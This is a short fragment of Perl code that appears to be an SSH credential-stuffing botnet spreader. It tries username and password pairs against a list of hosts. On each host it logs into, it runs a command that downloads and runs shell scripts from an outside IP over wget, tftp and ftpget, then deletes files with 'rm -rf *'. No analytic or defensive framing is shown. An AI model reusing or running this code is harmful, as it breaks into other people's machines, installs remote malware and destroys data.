...
scalar(@newarray); $i+=3) {
        ...
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://134.122.114.25/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 134.122.114.25 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; t ftp -r tftp2.sh -g 134.122.114.25; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymou s -P 21 134.122.114.25 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *');
                        sleep 10;
                        $channel->close;
